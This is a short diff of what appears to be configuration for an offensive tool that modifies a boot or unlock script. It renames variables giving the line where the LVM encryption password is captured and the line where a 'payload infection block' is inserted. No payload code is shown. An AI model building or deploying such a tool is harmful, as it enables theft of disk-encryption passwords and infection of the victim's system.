@@ -8,7 +8,7 @@
 #Script SHOULD get these lines' content and ask you
 
 #which line of script should be altered to get LVM password?
-EXTRALOGLINE=263
+EXTRALOGLINENUMBER=263
 #which line should contain payload infection block (best: just after password)?
-PAYLOADLINE=268
+PAYLOADLINENUMBER=268
 
